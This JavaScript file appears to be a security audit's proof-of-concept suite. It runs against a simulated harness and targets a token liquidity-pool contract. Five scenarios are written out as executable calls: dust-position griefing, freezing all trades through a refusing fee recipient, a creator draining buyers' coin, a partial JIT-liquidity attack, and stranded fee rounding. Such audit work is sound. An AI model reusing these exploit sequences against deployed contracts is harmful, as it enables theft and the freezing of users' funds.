import { world, setup, call, w, ETH, CREATE_SIG, mocks } from './harness.mjs';

const C = '0x00000000000000000000000000000000000c0de1';
const A = '0x0000000000000000000000000000000000a77ac1'; // attacker
const B = '0x0000000000000000000000000000000000b0b001'; // buyer / honest LP
const V = '0x0000000000000000000000000000000000b0b002'; // intended position buyer
const log = (...a) => console.log(...a);
const must = (r, what) => { if (!r.ok) throw new Error(what + ': ' + r.reason); return r; };

async function base(opts = {}) {
  const W = await world();
  for (const a of [C, A, B, V]) await W.fund(a);
  const S = await setup(W, { creator: C, ...opts });
  const approve = (from, amt) => W.exec(from, S.token, call('approve(address,uint256)', S.pool, amt));
  const xfer = (from, to, amt) => W.exec(from, S.token, call('transfer(address,uint256)', to, amt));
  const pool = async () => { const [fee, , , x, y, l, acc, fr] = W.words(await W.view(S.pool, call('pools(address)', S.token))); return { fee, x, y, l, acc, fr }; };
  const pos = async (o) => { const [open, shares, locked, cp, pending] = W.words(await W.view(S.pool, call('positions(address,address)', S.token, o))); return { open, shares, locked, cp, pending }; };
  const tbal = async (o) => W.words(await W.view(S.token, call('balanceOf(address)', o)))[0];
  return { W, S, approve, xfer, pool, pos, tbal };
}
async function create(E, { x0 = 10n ** 27n, l0 = 5n * ETH, lock = true, first = 0n } = {}) {
  must(await E.approve(C, x0), 'approve');
  return must(await E.W.exec(C, E.S.pool, call(CREATE_SIG, E.S.token, E.S.nonce, x0, l0, 0n, 100n, lock, C, first, 0n), E.S.creationFee + first), 'create');
}

// ---------------------------------------------------------------- PoC 1: position-transfer griefing / empty positions never close
{
  const E = await base();
  await create(E);
  must(await E.W.exec(A, E.S.pool, call('buy(address,uint256)', E.S.token, 0n), ETH / 100n), 'attacker buy');
  const p = await E.pool();
  const dl = 1000n;
  const tokens = (p.x * dl + p.l - 1n) / p.l, coin = (p.y * dl + p.l - 1n) / p.l;
  must(await E.approve(A, tokens), 'approve');
  must(await E.W.exec(A, E.S.pool, call('addLiquidity(address,uint256,uint256)', E.S.token, dl, tokens), coin), 'dust add');
  must(await E.W.exec(A, E.S.pool, call('lockLiquidity(address,uint256)', E.S.token, dl)), 'dust lock');
  must(await E.W.exec(A, E.S.pool, call('transferPosition(address,address)', E.S.token, V)), 'push dust to victim');
  const r = await E.W.exec(C, E.S.pool, call('transferPosition(address,address)', E.S.token, V));
  log('PoC1 dust add cost: tokens', tokens, 'coin wei', coin, '| creator->V transfer:', r.ok ? 'ok' : 'REVERT ' + r.reason);
  // A fully withdrawn position stays open for good
  must(await E.approve(B, 10n ** 30n), 'approveB');
  must(await E.W.exec(B, E.S.pool, call('buy(address,uint256)', E.S.token, 0n), ETH), 'B buy');
  const p2 = await E.pool();
  const dl2 = 10n ** 15n;
  must(await E.W.exec(B, E.S.pool, call('addLiquidity(address,uint256,uint256)', E.S.token, dl2, 10n ** 30n), (p2.y * dl2) / p2.l + 1n), 'B add');
  must(await E.W.exec(B, E.S.pool, call('removeLiquidity(address,uint256,uint256,uint256)', E.S.token, dl2, 0n, 0n)), 'B remove all');
  log('PoC1 B after removing everything: open =', (await E.pos(B)).open, 'shares =', (await E.pos(B)).shares);
  const r2 = await E.W.exec(C, E.S.pool, call('transferPosition(address,address)', E.S.token, B));
  log('PoC1 creator->B (empty but open) transfer:', r2.ok ? 'ok' : 'REVERT ' + r2.reason);
}

// ---------------------------------------------------------------- PoC 2: a fee recipient that stops accepting coin freezes every buy and sell, everywhere
{
  const { world: wf, setup: s2 } = await import('./harness.mjs');
  const W = await wf();
  for (const a of [B, '0x' + 'e'.repeat(40)]) await W.fund(a);
  const fr = await W.deploy('0x' + 'e'.repeat(40), mocks.Attacker.bytecode);
  const S = await s2(W, { creator: B, feeRecipient: fr, creationFee: 0n });

  must(await W.exec(B, S.token, call('approve(address,uint256)', S.pool, 10n ** 30n)), 'approve');
  must(await W.exec(B, S.pool, call(CREATE_SIG, S.token, S.nonce, 10n ** 27n, 5n * ETH, 0n, 100n, true, B, ETH, 0n), ETH), 'create with first buy');
  must(await W.exec(B, S.pool, call('sell(address,uint256,uint256)', S.token, 10n ** 24n, 0n)), 'sell before');
  must(await W.exec(B, fr, call('setRefuse(bool)', true)), 'fee address starts refusing');
  const b = await W.exec(B, S.pool, call('buy(address,uint256)', S.token, 0n), ETH);
  const s = await W.exec(B, S.pool, call('sell(address,uint256,uint256)', S.token, 10n ** 24n, 0n));
  const c = await W.exec(B, S.pool, call('claimFees(address)', S.token));
  log('PoC2 after fee address refuses: buy', b.ok ? 'ok' : 'REVERT ' + b.reason, '| sell', s.ok ? 'ok' : 'REVERT ' + s.reason, '| claim', c.ok ? 'ok' : 'REVERT ' + c.reason);
}

// ---------------------------------------------------------------- PoC 3: unlocked creator withdraws buyers' coin; remaining holders cannot sell
{
  const E = await base();
  await create(E, { lock: false });
  must(await E.W.exec(B, E.S.pool, call('buy(address,uint256)', E.S.token, 0n), 10n * ETH), 'B buys 10 ETH');
  const held = await E.tbal(B);
  const p = await E.pool();
  const before = await E.W.bal(C);
  must(await E.W.exec(C, E.S.pool, call('removeLiquidity(address,uint256,uint256,uint256)', E.S.token, p.l - 10n ** 12n, 0n, 0n)), 'creator removes');
  const got = (await E.W.bal(C)) - before;
  const q = await E.pool();
  const sellAll = await E.W.view(E.S.pool, call('quoteSell(address,uint256)', E.S.token, held));
  log('PoC3 creator took', got, 'wei of buyer coin; pool left x', q.x, 'y', q.y, 'l', q.l, '| quoteSell(all B tokens) =', E.W.words(sellAll));
}

// ---------------------------------------------------------------- PoC 4: JIT liquidity takes the LP fee of a large trade
{
  const E = await base();
  await create(E); // creator fully locked, 5 ETH virtual
  must(await E.W.exec(A, E.S.pool, call('buy(address,uint256)', E.S.token, 0n), ETH / 10n), 'A small buy to get tokens');
  const p = await E.pool();
  const dl = p.l * 9n; // 90% of the pool
  const tokens = (p.x * dl + p.l - 1n) / p.l, coin = (p.y * dl + p.l - 1n) / p.l;
  // A needs tokens: give A tokens from creator's wallet supply? creator deposited all; buy more first
  const have = await E.tbal(A);
  log('PoC4 A holds', have, 'needs', tokens, '(pool too thin to source tokens: JIT needs outside inventory)');
}

// ---------------------------------------------------------------- PoC 5: LP fee dust that no position can claim (acc rounding), per trade
{
  const E = await base();
  await create(E, { x0: 10n ** 27n, l0: 10n ** 30n }); // high virtual liquidity, 1e12 ETH-wei: tiny lp per trade vs l
  for (let i = 0; i < 5; i++) must(await E.W.exec(B, E.S.pool, call('buy(address,uint256)', E.S.token, 0n), 10_000n), 'tiny buy');
  const p = await E.pool();
  const claim = E.W.words(await E.W.view(E.S.pool, call('pendingFees(address,address)', E.S.token, C)))[0];
  log('PoC5 feeReserve', p.fr, 'acc', p.acc, 'claimable by the only LP', claim, '-> stranded', p.fr - claim);
}
